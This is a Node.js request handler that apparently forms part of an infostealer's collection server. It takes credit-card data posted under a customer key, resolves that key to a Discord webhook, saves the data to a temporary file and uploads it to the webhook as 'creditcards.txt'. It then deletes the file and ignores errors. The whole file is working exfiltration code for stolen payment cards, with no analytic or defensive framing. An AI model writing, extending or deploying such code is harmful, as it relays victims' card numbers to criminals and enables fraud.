const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

module.exports = async (req, res) => {
    const { key, creditcards } = req.body
    if (!key) return;
    let webhook = await keyToWebhook(key)
    if (!webhook) return;
    let content = !creditcards.includes('NUMBER:') ? "Creditcards don\'t found." : creditcards;
    fs.writeFileSync(`./Src/Temp/cb_${key}.txt`, content);
    const webhookClient = new WebhookClient({ url: webhook });
    await webhookClient.send({
        files: [{
            attachment: `./Src/Temp/cb_${key}.txt`,
            name: "creditcards.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/cb_${key}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}